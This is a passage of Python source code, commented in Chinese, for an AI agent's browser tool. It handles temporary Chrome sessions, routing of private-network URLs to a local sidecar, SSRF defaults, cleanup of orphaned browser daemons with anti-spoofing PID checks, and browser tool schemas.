    browser_env["PATH"] = _merge_browser_path(browser_env.get("PATH", ""))

    if "AGENT_BROWSER_IDLE_TIMEOUT_MS" not in browser_env:
        browser_env["AGENT_BROWSER_IDLE_TIMEOUT_MS"] = str(BROWSER_SESSION_INACTIVITY_TIMEOUT * 1000)

    def _run_tmp(cmd: str, cmd_args: List[str]) -> Dict[str, Any]:
        full = base_args + [cmd] + cmd_args
        # 使用临时文件作为 stdout/stderr（与 _run_browser_command 相同），
        # 避免 agent-browser 守护进程继承文件描述符导致的管道挂起。
        stdout_path = os.path.join(task_socket_dir, f"_stdout_{cmd}")
        stderr_path = os.path.join(task_socket_dir, f"_stderr_{cmd}")
        stdout_fd = os.open(stdout_path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
        stderr_fd = os.open(stderr_path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
        try:
            # 在 Windows 上，把子进程放到一个新的进程组中启动，使父控制台
            # 的 Ctrl+C 不会以 STATUS_CONTROL_C_EXIT
            # （0xC000013A = rc 3221225786）把它一并杀掉，同时把它的
            # 标准输入输出与句柄继承与父进程隔离开。
            #
            # 在 CREATE_NEW_PROCESS_GROUP 之外的额外 Windows 加固：
            # * STARTF_USESTDHANDLES + 显式句柄 → CreateProcess 只把我们
            #   选定的三个句柄（DEVNULL 的 stdin + 临时文件的 stdout/stderr）
            #   交给子进程。否则某些父进程会泄漏控制台句柄，破坏下游再派生
            #   的孙进程 —— agent-browser 的 Rust 二进制会派生一个脱离的
            #   守护进程孙进程，而当继承自父进程的句柄处于异常状态时，
            #   该孙进程的 CreateProcess 会静默失败
            #   （"Daemon process exited during startup with no error output"）。
            #   此问题在 Hermes CLI 中观察到了：sys.stdout 和 sys.stderr 都
            #   报告 fileno=1（stderr 在 OS 层被 dup 到了 stdout 上）。
            # * close_fds=True → 阻断其他所有句柄的继承。
            #   （POSIX 上默认开启；在 Windows 上对标准输入输出必须显式设置。）
            _popen_extra: dict = {}
            if os.name == "nt":
                # CREATE_NO_WINDOW → 不附加控制台（否则 cmd.exe 会为 .cmd 垫片
                # 短暂分配一个控制台）。
                # 不要加 CREATE_NEW_PROCESS_GROUP：在 Python 3.11 Windows 上，
                # 它会与 asyncio 的 ProactorEventLoop 相互作用，导致子进程
                # 创建时取消正在运行的 loop 任务，表现为 app.run() 中抛出
                # KeyboardInterrupt，并在回合中途把 CLI 拆掉。agent 线程的
                # 子进程派生曾经就这样解开了 MainThread 的 prompt_toolkit
                # 事件循环 —— 参见诊断日志：
                # "asyncio.CancelledError → KeyboardInterrupt"。
                _CREATE_NO_WINDOW = 0x08000000
                _popen_extra["creationflags"] = _CREATE_NO_WINDOW
                _popen_extra["close_fds"] = True
                _si = subprocess.STARTUPINFO()
                _si.dwFlags |= subprocess.STARTF_USESTDHANDLES
                _popen_extra["startupinfo"] = _si
            proc = subprocess.Popen(
                full, stdout=stdout_fd, stderr=stderr_fd,
                stdin=subprocess.DEVNULL, env=browser_env,
                **_popen_extra,
            )
        finally:
            os.close(stdout_fd)
            os.close(stderr_fd)
        try:
            proc.wait(timeout=timeout)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait()
            return {"success": False, "error": f"Chrome fallback '{cmd}' timed out"}
        try:
            with open(stdout_path, "r", encoding="utf-8") as f:
                stdout = f.read().strip()
            if stdout:
                return json.loads(stdout.split("\n")[-1])
        except Exception as exc:
            logger.debug("Chrome fallback tmp cmd '%s' error: %s", cmd, exc)
        finally:
            for pth in (stdout_path, stderr_path):
                try:
                    os.unlink(pth)
                except OSError:
                    pass
        return {"success": False, "error": f"Chrome fallback '{cmd}' failed"}

    try:
        # 3. 把 Chrome 导航到同一个 URL。
        nav = _run_tmp("open", [current_url])
        if not nav.get("success"):
            logger.warning("Chrome fallback: navigate failed: %s", nav.get("error"))
            return {"success": False, "error": f"Chrome fallback navigate failed: {nav.get('error')}"}

        # 4. 在 Chrome 中运行所请求的命令。
        return _run_tmp(command, args)

    finally:
        # 5. 销毁临时 Chrome 会话。
        try:
            _run_tmp("close", [])
        except Exception:
            pass
        # 清理 socket 目录
        import shutil as _shutil
        _shutil.rmtree(task_socket_dir, ignore_errors=True)


def _chrome_fallback_screenshot(
    task_id: str,
    args: List[str],
    timeout: int,
) -> Dict[str, Any]:
    """使用临时 Chrome 会话进行截图。"""
    return _run_chrome_fallback_command(task_id, "screenshot", args, timeout)


def _auto_local_for_private_urls() -> bool:
    """返回在配置了云端的安装中，是否应为 LAN/localhost URL 自动拉起一个
    本地 Chromium。

    读取一次 ``browser.auto_local_for_private_urls``（默认 ``True``）并
    在进程生命周期内缓存。开启后，即使全局配置了云端 provider（Browserbase
    / Browser-Use / Firecrawl），``browser_navigate`` 也会把主机解析为
    私有/回环/LAN 地址的 URL 路由到本地 headless Chromium 边车（sidecar）。
    同一会话中公有 URL 仍走云端 provider。
    """
    global _auto_local_for_private_urls_resolved, _cached_auto_local_for_private_urls
    if _auto_local_for_private_urls_resolved:
        return _cached_auto_local_for_private_urls

    _auto_local_for_private_urls_resolved = True
    try:
        from hermes_cli.config import read_raw_config
        cfg = read_raw_config()
        browser_cfg = cfg.get("browser", {})
        if isinstance(browser_cfg, dict) and "auto_local_for_private_urls" in browser_cfg:
            _cached_auto_local_for_private_urls = bool(
                browser_cfg.get("auto_local_for_private_urls")
            )
    except Exception as e:
        logger.debug("Could not read auto_local_for_private_urls from config: %s", e)
    return _cached_auto_local_for_private_urls


def _url_is_private(url: str) -> bool:
    """当 URL 的主机解析为私有/LAN/回环地址时返回 True。

    复用 ``tools.url_safety.is_safe_url`` 作为判定依据 —— 如果 SSRF 检查会
    拒绝该 URL，我们就把它视为「私有」以用于路由。DNS 解析失败视为非私有
    （交给已配置的后端处理，让它自然地暴露 DNS 错误）。
    """
    try:
        # is_safe_url 对私有/回环/链路本地/CGNAT 地址以及 DNS 失败
        # 都会返回 False。这里我们只关心「私有网络」这种情况，因此
        # 先解析并检查主机形态，作为 DNS 失败的过滤筛。
        from urllib.parse import urlparse
        import ipaddress
        import socket
        parsed = urlparse(url)
        hostname = (parsed.hostname or "").strip().lower().rstrip(".")
        if not hostname:
            return False
        # 字面量 IP → 直接检查
        try:
            ip = ipaddress.ip_address(hostname)
            return (
                ip.is_private
                or ip.is_loopback
                or ip.is_link_local
                # 172.16.0.0/12：仅在 Python ≥3.11 上才会被 ip.is_private 覆盖
                # （bpo-40791）。显式检查可保证 3.10 运行时也能正确把这些
                # 地址路由到本地 sidecar。
                or ip in ipaddress.ip_network("172.16.0.0/12")
                or ip in ipaddress.ip_network("100.64.0.0/10")
            )
        except ValueError:
            pass
        # 主机名 —— 必须解析才能确认是否为私有（裸的 "localhost" 会通过
        # /etc/hosts 解析为 127.0.0.1）。对明显的名称做短路判断，避免一次
        # DNS 往返。
        if hostname in {"localhost",} or hostname.endswith(".localhost"):
            return True
        if hostname.endswith(".local") or hostname.endswith(".lan") or hostname.endswith(".internal"):
            return True
        try:
            addr_info = socket.getaddrinfo(hostname, None, socket.AF_UNSPEC, socket.SOCK_STREAM)
        except socket.gaierror:
            return False  # DNS 失败 → 非私有，交给正常路径去失败
        for _, _, _, _, sockaddr in addr_info:
            try:
                ip = ipaddress.ip_address(sockaddr[0])
            except ValueError:
                continue
            if (
                ip.is_private
                or ip.is_loopback
                or ip.is_link_local
                or ip in ipaddress.ip_network("100.64.0.0/10")
            ):
                return True
        return False
    except Exception as exc:
        logger.debug("URL-privacy check failed for %s: %s", url, exc)
        return False


def _navigation_session_key(task_id: str, url: str) -> str:
    """为 ``task_id`` 选出应当处理 ``url`` 的会话 key。

    除非以下条件全部成立，否则返回裸 task_id：
      1. 配置了云端 provider（``_get_cloud_provider()`` 不为 None）。
      2. 启用了本地自动路由（``browser.auto_local_for_private_urls``，
         默认 True）。
      3. 该 URL 解析到私有/LAN/回环地址。
      4. 当前没有激活的 CDP 覆盖（该路径独占整个会话）。
      5. 当前未激活 Camofox 模式（Camofox 本身已经是纯本地）。

    全部成立时返回 ``f"{task_id}::local"``，这样混合路由路径会拉起一个
    本地 Chromium 边车，而云端会话（如果有）继续服务公有 URL。
    """
    if task_id is None:
        task_id = "default"
    if _get_cdp_override():
        return task_id
    if _is_camofox_mode():
        return task_id
    if _get_cloud_provider() is None:
        return task_id
    if not _auto_local_for_private_urls():
        return task_id
    if not _url_is_private(url):
        return task_id
    return f"{task_id}{_LOCAL_SUFFIX}"


def _is_local_sidecar_key(session_key: str) -> bool:
    """当 ``session_key`` 是混合路由的本地边车时返回 True。"""
    return session_key.endswith(_LOCAL_SUFFIX)


def _last_session_key(task_id: str) -> str:
    """返回非导航类浏览器工具调用应使用的会话 key。

    如果此前在该 task_id 上执行的 ``browser_navigate`` 设置过最近活跃的 key，
    就使用它，使 snapshot/click/fill 等命中同一会话。否则回落到裸 task_id
    （与从未触发过混合路由的任务的原始行为一致）。
    """
    if task_id is None:
        task_id = "default"
    return _last_active_session_key.get(task_id, task_id)


def _allow_private_urls() -> bool:
    """返回浏览器是否被允许导航到私有/内部地址。

    读取一次 ``config["browser"]["allow_private_urls"]`` 并在进程生命周期内
    缓存结果。默认为 ``False``（启用 SSRF 防护）。
    """
    global _cached_allow_private_urls, _allow_private_urls_resolved
    if _allow_private_urls_resolved:
        return _cached_allow_private_urls

    _allow_private_urls_resolved = True
    _cached_allow_private_urls = False  # 安全默认值
    try:
        from hermes_cli.config import read_raw_config
        cfg = read_raw_config()
        browser_cfg = cfg.get("browser", {})
        if isinstance(browser_cfg, dict):
            _cached_allow_private_urls = is_truthy_value(
                browser_cfg.get("allow_private_urls"), default=False
            )
    except Exception as e:
        logger.debug("Could not read allow_private_urls from config: %s", e)
    return _cached_allow_private_urls


def _socket_safe_tmpdir() -> str:
    """返回一个适合用于 Unix domain socket 的、较短的临时目录路径。

    macOS 把 ``TMPDIR`` 设为 ``/var/folders/xx/.../T/``（约 51 个字符）。当我们
    追加 ``agent-browser-hermes_…`` 后，得到的 socket 路径会超过 macOS 对
    ``AF_UNIX`` 地址 104 字节的限制，导致 agent-browser 报
    "Failed to create socket directory" 或截图静默失败。

    Linux 上 ``tempfile.gettempdir()`` 本就返回 ``/tmp``，所以那里是 no-op。
    在 macOS 上我们绕过 ``TMPDIR`` 直接使用 ``/tmp``
    （软链到 ``/private/tmp``，有 sticky-bit 保护，始终可用）。
    """
    if sys.platform == "darwin":
        return "/tmp"
    return tempfile.gettempdir()


# 按「会话 key」跟踪活动会话。
#
#「会话 key」要么是裸 task_id（云端/默认路径），要么是
# f"{task_id}::local" 这样的复合 key —— 后者出现在混合路由功能为某个
# LAN/localhost URL 拉起本地 sidecar 浏览器、而全局又配置了云端 provider 时。
# 两种形式都会流经同一套 _active_sessions / _run_browser_command /
# cleanup_browser 代码路径 —— key 对这些内部逻辑是不透明的。
#
# 存储内容：session_name（必有），bb_session_id + cdp_url（仅云端模式）
_active_sessions: Dict[str, Dict[str, str]] = {}  # session_key -> {session_name, ...}
_recording_sessions: set = set()  # 正在录制中的 session_key 集合

# 跟踪每个 task_id 最近使用的 session_key。由 browser_navigate() 在为某个 URL
# 选定后端后设置；供每个非导航类浏览器工具（snapshot/click/fill/eval/...）读取，
# 以确保它们命中服务于上次导航的会话。若没有这一映射，一个在本地 sidecar 上
# 导航到 localhost 的任务，下一次调用 snapshot 时就会回落到云端会话。
_last_active_session_key: Dict[str, str] = {}  # task_id -> session_key
_LOCAL_SUFFIX = "::local"

# 标记是否已完成清理
_cleanup_done = False

# =============================================================================
# 不活跃超时配置
# =============================================================================

# 会话不活跃超时时间（秒）—— 超过这么久没有活动就清理。
# config.yaml 是权威来源；BROWSER_INACTIVITY_TIMEOUT 作为遗留兜底保留，
# 以便尚未迁移的旧部署仍能正常工作。
DEFAULT_SESSION_INACTIVITY_TIMEOUT = int(
    DEFAULT_CONFIG.get("browser", {}).get("inactivity_timeout", 120)
)


def _get_session_inactivity_timeout() -> int:
    result = env_int("BROWSER_INACTIVITY_TIMEOUT", DEFAULT_SESSION_INACTIVITY_TIMEOUT)
    try:
        from hermes_cli.config import read_raw_config
        cfg = read_raw_config()
        val = cfg_get(cfg, "browser", "inactivity_timeout")
        if val is not None:
            result = max(int(val), 30)  # 下限为 30 秒，避免被瞬间回收
    except Exception as e:
        logger.debug("Could not read inactivity_timeout from config: %s", e)
    return result


BROWSER_SESSION_INACTIVITY_TIMEOUT = _get_session_inactivity_timeout()

# 跟踪每个会话的最后活动时间
_session_last_activity: Dict[str, float] = {}

# 后台清理线程状态
_cleanup_thread = None
_cleanup_running = False
# 为线程安全保护 _session_last_activity 与 _active_sessions
# （子 agent 通过 ThreadPoolExecutor 并发运行）
_cleanup_lock = threading.Lock()


def _emergency_cleanup_all_sessions():
    """
    紧急清理所有活动浏览器会话。
    在进程退出或被中断时调用，以避免产生孤儿会话。

    同时会运行孤儿回收器，清理此前崩溃的 hermes 进程留下的守护进程 ——
    这样每一次正常的 hermes 退出都会清扫累积的孤儿，而不仅仅是那些
    实际使用了浏览器工具的进程。
    """
    global _cleanup_done
    if _cleanup_done:
        return
    _cleanup_done = True

    # 先清理本进程自己的会话，以便在回收器扫描前把它们的 owner_pid 文件
    # 删除掉。
    if _active_sessions:
        logger.info("Emergency cleanup: closing %s active session(s)...",
                    len(_active_sessions))
        try:
            cleanup_all_browsers()
        except Exception as e:
            logger.error("Emergency cleanup error: %s", e)
        finally:
            with _cleanup_lock:
                _active_sessions.clear()
                _session_last_activity.clear()
                _recording_sessions.clear()

    # 清扫其他崩溃的 hermes 进程留下的孤儿。即使我们从未使用浏览器也安全
    # —— 它会依据 owner_pid 的存活性判断，避免回收仍属于其他存活 hermes
    # 进程的守护进程。
    try:
        _reap_orphaned_browser_sessions()
    except Exception as e:
        logger.debug("Orphan reap on exit failed: %s", e)


# 只通过 atexit 注册清理。旧版本曾安装 SIGINT/SIGTERM 处理器并调用
# sys.exit()，但这会与 prompt_toolkit 的异步事件循环冲突 —— 在按键回调里
# 抛出 SystemExit 会破坏协程状态，使进程无法被杀死。atexit 处理器在任何
# 正常退出时（包括 sys.exit）都会运行，因此既能清理浏览器会话，
# 又不必劫持信号。
atexit.register(_emergency_cleanup_all_sessions)


# =============================================================================
# 不活跃清理函数
# =============================================================================

def _cleanup_inactive_browser_sessions():
    """
    清理超过超时时间未活动的浏览器会话。

    本函数由后台清理线程周期性调用，自动关闭近期未使用的会话，
    防止孤儿会话（本地或 Browserbase）累积。
    """
    current_time = time.time()
    sessions_to_cleanup = []

    with _cleanup_lock:
        for task_id, last_time in list(_session_last_activity.items()):
            if current_time - last_time > BROWSER_SESSION_INACTIVITY_TIMEOUT:
                sessions_to_cleanup.append(task_id)

    for task_id in sessions_to_cleanup:
        try:
            elapsed = int(current_time - _session_last_activity.get(task_id, current_time))
            logger.info("Cleaning up inactive session for task: %s (inactive for %ss)", task_id, elapsed)
            cleanup_browser(task_id)
            with _cleanup_lock:
                if task_id in _session_last_activity:
                    del _session_last_activity[task_id]
        except Exception as e:
            logger.warning("Error cleaning up inactive session %s: %s", task_id, e)


def _write_owner_pid(socket_dir: str, session_name: str) -> None:
    """把当前 hermes 的 PID 记录为某个浏览器 socket 目录的拥有者。

    原子地写入 ``<socket_dir>/<session_name>.owner_pid``，这样孤儿回收器就能
    区分：守护进程的拥有者进程仍存活（不要回收）还是拥有者已崩溃
    （需要回收）。尽力而为 —— 这里发生 OSError 只是让回收器回落到
    旧版基于 ``tracked_names`` 的启发式判断。
    """
    try:
        path = os.path.join(socket_dir, f"{session_name}.owner_pid")
        with open(path, "w", encoding="utf-8") as f:
            f.write(str(os.getpid()))
    except OSError as exc:
        logger.debug("Could not write owner_pid file for %s: %s",
                     session_name, exc)


def _verify_reapable_browser_daemon(daemon_pid: int, socket_dir: str,
                                    session_name: str) -> bool:
    """确认一个存活的 PID 确实就是本会话的 agent-browser 守护进程。

    孤儿回收器会扫描那些全局可写、名字可预测的临时路径
    （``/tmp/agent-browser-h_*`` 等），并从 ``.pid`` 文件读取守护进程的
    PID —— 该文件并非我们写入，而是 agent-browser 守护进程自己写的。
    因此，同用户下的恶意调用者可以伪造一个 socket 目录，让其中的 ``.pid``
    指向任意受害者进程；或者真实守护进程退出后，被复用的 PID 恰好落到
    一个无关进程上。无论哪种情况，终止那个 PID
    （通过 ``_terminate_host_pid`` 做整树 kill）都是对任意进程的 DoS。

    回收前，我们通过 ``psutil``（硬依赖，跨平台支持同用户进程 ——
    也就是回收器唯一能发信号的进程）要求满足：

      1. **身份** —— 该进程看起来像 agent-browser：其名称或命令行中包含
         ``agent-browser``。
      2. **绑定** —— 该进程绑定到本会话的 socket 目录：命令行中出现了
         该 socket 目录路径（或其 basename），或者进程环境变量里的
         ``AGENT_BROWSER_SOCKET_DIR`` 指向它。

    要求 (2) 才是真正的防伪造防线：一个被植入、指向受害者 PID 的进程，
    其 cmdline/environ 不可能引用到我们的 socket 目录。攻击者必须拥有
    一个真正内嵌了这个精确会话路径的进程 —— 也就是一个他们已经拥有、
    并且可以直接发信号的真实守护进程。失败即关闭（fail-closed）：
    任何含糊之处（cmdline 不可读、没有匹配）都意味着我们拒绝回收，
    原样保留该进程及其 socket 目录。

    只有上述两项检查都通过时才返回 ``True``。
    """
    try:
        import psutil
    except ImportError:  # psutil 是硬依赖；这里只是防御性处理
        logger.warning(
            "Refusing to reap browser daemon PID %d (session %s): "
            "psutil unavailable for identity verification",
            daemon_pid, session_name)
        return False

    try:
        proc = psutil.Process(daemon_pid)
        name = (proc.name() or "").lower()
        cmdline = " ".join(proc.cmdline() or []).lower()
    except psutil.NoSuchProcess:
        # 在存活检查与当下之间消失了 —— 没有可回收的。
        return False
    except (psutil.AccessDenied, OSError) as exc:
        logger.warning(
            "Refusing to reap browser daemon PID %d (session %s): "
            "could not read process identity (%s)",
            daemon_pid, session_name, exc)
        return False

    looks_like_browser = "agent-browser" in name or "agent-browser" in cmdline
    if not looks_like_browser:
        logger.warning(
            "Refusing to reap PID %d (session %s): not an agent-browser "
            "process (name=%r)", daemon_pid, session_name, name)
        return False

    # 绑定检查：存活进程必须引用本 socket 目录。
    socket_dir_l = socket_dir.lower()
    socket_base_l = os.path.basename(socket_dir).lower()
    bound = socket_dir_l in cmdline or (
        socket_base_l and socket_base_l in cmdline)
    if not bound:
        try:
            env_dir = (proc.environ() or {}).get(
                "AGENT_BROWSER_SOCKET_DIR", "")
            bound = bool(env_dir) and os.path.normpath(env_dir) == \
                os.path.normpath(socket_dir)
        except (psutil.AccessDenied, psutil.NoSuchProcess, OSError):
            # 在某些平台上，即便是同用户 environ() 也可能被拒绝。
            # cmdline 已经无法匹配 —— 失败即关闭。
            bound = False

    if not bound:
        logger.warning(
            "Refusing to reap agent-browser PID %d: not bound to session "
            "socket dir %s (possible recycled PID or planted pid file)",
            daemon_pid, socket_dir)
        return False

    return True


def _reap_orphaned_browser_sessions():
    """扫描此前运行遗留的 agent-browser 守护进程孤儿。

    当创建浏览器会话的 Python 进程异常退出（SIGKILL、崩溃、gateway 重启）时，
    内存中的 ``_active_sessions`` 跟踪信息会丢失，但 node + Chromium 进程
    仍在运行。

    本函数扫描 tmp 目录下此前运行遗留的 ``agent-browser-*`` socket 目录，
    读取守护进程的 PID 文件，并杀掉拥有它的 hermes 进程已不再存活的那些
    守护进程。

    归属判定的优先级：
      1. ``<session>.owner_pid`` 文件（由当前代码写入）—— 如果引用的 hermes
         PID 仍存活，无论它是否在 *本* 进程的 ``_active_sessions`` 中，
         都不要动这个守护进程。这是跨进程安全的：两个并发的 hermes 实例
         不会互相回收对方的守护进程。
      2. 针对 owner_pid 出现之前就存在的守护进程的兜底：检查当前进程的
         ``_active_sessions``。若未被跟踪，则视为孤儿（旧行为）。

    在任何上下文中调用都安全 —— atexit、清理线程、或按需调用。
    """
    import glob

    tmpdir = _socket_safe_tmpdir()
    pattern = os.path.join(tmpdir, "agent-browser-h_*")
    socket_dirs = glob.glob(pattern)
    # 同时收集 CDP 会话
    socket_dirs += glob.glob(os.path.join(tmpdir, "agent-browser-cdp_*"))
    # 同时收集云端 provider 会话（browser-use/browserbase/firecrawl）
    socket_dirs += glob.glob(os.path.join(tmpdir, "agent-browser-hermes_*"))

    if not socket_dirs:
        return

    # 构建本进程当前跟踪的 session_name 集合（兜底路径）
    with _cleanup_lock:
        tracked_names = {
            info.get("session_name")
            for info in _active_sessions.values()
            if info.get("session_name")
        }

    reaped = 0
    for socket_dir in socket_dirs:
        dir_name = os.path.basename(socket_dir)
        # dir_name 形如 "agent-browser-{session_name}"
        session_name = dir_name.removeprefix("agent-browser-")
        if not session_name:
            continue

        # 归属检查：优先使用 owner_pid 文件（跨进程安全）。
        owner_pid_file = os.path.join(socket_dir, f"{session_name}.owner_pid")
        owner_alive: Optional[bool] = None  # None = owner_pid 缺失/不可读
        if os.path.isfile(owner_pid_file):
            try:
                owner_pid = int(Path(owner_pid_file).read_text(encoding="utf-8").strip())
                # ``os.kill(pid, 0)`` 在 Windows 上并不是 no-op（bpo-14484）。
                # 使用跨平台的存在性检查。
                from gateway.status import _pid_exists
                owner_alive = _pid_exists(owner_pid)
            except (ValueError, OSError):
                owner_alive = None  # 文件损坏 —— 走兜底逻辑

        if owner_alive is True:
            # 拥有者仍存活 —— 该会话属于一个仍存活的 hermes 进程。
            continue

        if owner_alive is None:
            # 没有 owner_pid 文件（旧版守护进程）。回落到进程内跟踪：
            # 若本进程知道这个会话，则保持不动。
            if session_name in tracked_names:
                continue

        # owner_alive 为 False（拥有者已死）或是未被跟踪的旧版守护进程。
        pid_file = os.path.join(socket_dir, f"{session_name}.pid")
        if not os.path.isfile(pid_file):
            # 没有守护进程 PID 文件 —— 只是一个过期目录，删除即可
            shutil.rmtree(socket_dir, ignore_errors=True)
            continue

        try:
            daemon_pid = int(Path(pid_file).read_text(encoding="utf-8").strip())
        except (ValueError, OSError):
            shutil.rmtree(socket_dir, ignore_errors=True)
            continue

        # 检查守护进程是否仍存活。``os.kill(pid, 0)`` 在 Windows 上并不是
        # no-op —— 使用基于句柄的存在性检查。
        from gateway.status import _pid_exists
        if not _pid_exists(daemon_pid):
            shutil.rmtree(socket_dir, ignore_errors=True)
            continue

        # PID 仍存活 —— 但该 .pid 文件位于一个我们并不写入、全局可写、名字
        # 可预测的临时目录里，并且真实守护进程退出后 PID 会被复用。在整树
        # kill 之前，先验证该进程确实就是本会话的 agent-browser 守护进程；
        # 否则拒绝处理（既不碰该进程，也保留 socket 目录，留待下一次清扫，
        # 等冒名 PID 退场）。修复 issue #14073 中针对同用户任意进程的 DoS。
        if not _verify_reapable_browser_daemon(
                daemon_pid, socket_dir, session_name):
            continue

        # 守护进程仍存活，且其拥有者已死（或是未被跟踪的旧版守护进程）。回收。
        # 使用进程树终止辅助函数，以便把 Chromium 的子进程
        # （renderer、GPU 等）一并清理掉，而不仅仅是守护进程父进程。
        try:
            from tools.process_registry import ProcessRegistry
            ProcessRegistry._terminate_host_pid(daemon_pid)
            logger.info("Reaped orphaned browser daemon PID %d (session %s)",
                        daemon_pid, session_name)
            reaped += 1
        except (ProcessLookupError, PermissionError, OSError):
            pass

        # 清理 socket 目录
        shutil.rmtree(socket_dir, ignore_errors=True)

    if reaped:
        logger.info("Reaped %d orphaned browser session(s) from previous run(s)", reaped)


def _browser_cleanup_thread_worker():
    """
    周期性清理不活跃浏览器会话的后台线程。

    每 30 秒运行一次，检查在 BROWSER_SESSION_INACTIVITY_TIMEOUT 时间段内
    未被使用的会话。
    首次运行时还会回收此前进程生命周期遗留的孤儿会话。
    """
    # 启动时进行一次性的孤儿回收
    try:
        _reap_orphaned_browser_sessions()
    except Exception as e:
        logger.warning("Orphan reap error: %s", e)

    while _cleanup_running:
        try:
            _cleanup_inactive_browser_sessions()
        except Exception as e:
            logger.warning("Cleanup thread error: %s", e)

        # 以 1 秒为单位分段睡眠，以便需要时能快速停止
        for _ in range(30):
            if not _cleanup_running:
                break
            time.sleep(1)


def _start_browser_cleanup_thread():
    """若后台清理线程尚未运行，则启动它。"""
    global _cleanup_thread, _cleanup_running

    with _cleanup_lock:
        if _cleanup_thread is None or not _cleanup_thread.is_alive():
            _cleanup_running = True
            _cleanup_thread = threading.Thread(
                target=_browser_cleanup_thread_worker,
                daemon=True,
                name="browser-cleanup"
            )
            _cleanup_thread.start()
            logger.info("Started inactivity cleanup thread (timeout: %ss)", BROWSER_SESSION_INACTIVITY_TIMEOUT)


def _stop_browser_cleanup_thread():
    """停止后台清理线程。"""
    global _cleanup_running
    _cleanup_running = False
    if _cleanup_thread is not None:
        _cleanup_thread.join(timeout=5)


def _update_session_activity(task_id: str):
    """更新某个会话的最后活动时间戳。"""
    with _cleanup_lock:
        _session_last_activity[task_id] = time.time()


# 注册退出时停止清理线程
atexit.register(_stop_browser_cleanup_thread)


# ============================================================================
# 工具 Schema
# ============================================================================

BROWSER_TOOL_SCHEMAS = [
    {
        "name": "browser_navigate",
        "description": "Navigate to a URL in the browser. Initializes the session and loads the page. Must be called before other browser tools. For simple information retrieval, prefer web_search or web_extract (faster, cheaper). For plain-text endpoints — URLs ending in .md, .txt, .json, .yaml, .yml, .csv, .xml, raw.githubusercontent.com, or any documented API endpoint — prefer curl via the terminal tool or web_extract; the browser stack is overkill and much slower for these. Use browser tools when you need to interact with a page (click, fill forms, dynamic content). Returns a compact page snapshot with interactive elements and ref IDs — no need to call browser_snapshot separately after navigating.",
        "parameters": {
            "type": "object",
            "properties": {
                "url": {
                    "type": "string",
                    "description": "The URL to navigate to (e.g., 'https://example.com')"
                }
            },
            "required": ["url"]
        }
    },
    {
        "name": "browser_snapshot",
        "description": "Get a text-based snapshot of the current page's accessibility tree. Returns interactive elements with ref IDs (like @e1, @e2) for browser_click and browser_type. full=false (default): compact view with interactive elements. full=true: complete page content. Snapshots over 8000 chars are truncated or LLM-summarized. Requires browser_navigate first. Note: browser_navigate already returns a compact snapshot — use this to refresh after interactions that change the page, or with full=true for complete content.",
        "parameters": {
            "type": "object",
            "properties": {
                "full": {
                    "type": "boolean",
                    "description": "If true, returns complete page content. If false (default), returns compact view with interactive elements only.",
                    "default": False
                }
            },
            "required": []
        }
    },
    {
        "name": "browser_click",
        "description": "Click on an element identified by its ref ID from the snapshot (e.g., '@e5'). The ref IDs are shown in square brackets in the snapshot output. Requires browser_navigate and browser_snapshot to be called first.",
        "parameters": {
            "type": "object",
            "properties": {
                "ref": {
                    "type": "string",
                    "description": "The element reference from the snapshot (e.g., '@e5', '@e12')"
                }
            },
            "required": ["ref"]
        }
    },
    {
        "name": "browser_type",
        "description": "Type text into an input field identified by its ref ID. Clears the field first, then types the new text. Requires browser_navigate and browser_snapshot to be called first.",
        "parameters": {
            "type": "object",
            "properties": {
                "ref": {
                    "type": "string",
                    "description": "The element reference from the snapshot (e.g., '@e3')"
                },
                "text": {
                    "type": "string",
                    "description": "The text to type into the field"
                }
            },
            "required": ["ref", "text"]
        }
    },
    {
        "name": "browser_scroll",
        "description": "Scroll the page in a direction. Use this to reveal more content that may be below or above the current viewport. Requires browser_navigate to be called first.",
        "parameters": {
            "type": "object",
            "properties": {
                "direction": {
                    "type": "string",
                    "enum": ["up", "down"],
                    "description": "Direction to scroll"
                }
            },
            "required": ["direction"]
        }
    },
    {
        "name": "browser_back",
        "description": "Navigate back to the previous page in browser history. Requires browser_navigate to be called first.",
        "parameters": {
            "type": "object",
            "properties": {},
            "required": []
        }
    },
    {
        "name": "browser_press",
        "description": "Press a keyboard key. Useful for submitting forms (Enter), navigating (Tab), or keyboard shortcuts. Requires browser_navigate to be called first.",
        "parameters": {
            "type": "object",
            "properties": {
                "key": {
                    "type": "string",
                    "description": "Key to press (e.g., 'Enter', 'Tab', 'Escape', 'ArrowDown')"
                }
            },
            "required": ["key"]
        }
    },
    {
        "name": "browser_get_images",
        "description": "Get a list of all images on the current page with their URLs and alt text. Useful for finding images to analyze with the vision tool. Requires browser_navigate to be called first.",
        "parameters": {
            "type": "object",
            "properties": {},
            "required": []
        }
    },
    {
        "name": "browser_vision",
        "description": "Take a screenshot of the current page so you can inspect it visually. Use this when you need to understand what the page looks like - especially for CAPTCHAs, visual verification challenges, complex layouts, or cases where the text snapshot misses important visual information. When your active model has native vision, the screenshot is attached to your context directly and you inspect it on the next turn; otherwise Hermes falls back to an auxiliary vision model and returns a text analysis. Includes a screenshot_path that you can share with the user by including MEDIA:<screenshot_path> in your response. Requires browser_navigate to be called first.",
        "parameters": {
            "type": "object",
            "properties": {
                "question": {
                    "type": "string",
                    "description": "What you want to know about the page visually. Be specific about what you're looking for."
                },
                "annotate": {
                    "type": "boolean",
                    "default": False,
                    "description": "If true, overlay numbered [N] labels on interactive elements. Each [N] maps to ref @eN for subsequent browser commands. Useful for QA and spatial reasoning about page layout."
                }
            },
            "required": ["question"]
        }
    },
    {
        "name": "browser_console",
        "description": "Get browser console output and JavaScript errors from the current page. Returns console.log/warn/error/info messages and uncaught JS exceptions. Use this to detect silent JavaScript errors, failed API calls, and application warnings. Requires browser_navigate to be called first. When 'expression' is provided, evaluates JavaScript in the page context and returns the result — use this for DOM inspection, reading page state, or extracting data programmatically.",
        "parameters": {
            "type": "object",
            "properties": {
                "clear": {
                    "type": "boolean",
                    "default": False,
                    "description": "If true, clear the message buffers after reading"
                },
                "expression": {
                    "type": "string",
                    "description": "JavaScript expression to evaluate in the page context. Runs in the browser like DevTools console — full access to DOM, window, document. Return values are serialized to JSON. Example: 'document.title' or 'document.querySelectorAll(\"a\").length'"
                }
            },
            "required": []
        }
    },
]


# ============================================================================
# 工具函数
# ============================================================================

def _create_local_session(task_id: str) -> Dict[str, str]:
    import uuid
    session_name = f"h_{uuid.uuid4().hex[:10]}"
    logger.info("Created local browser session %s for task %s",
                session_name, task_id)
    return {
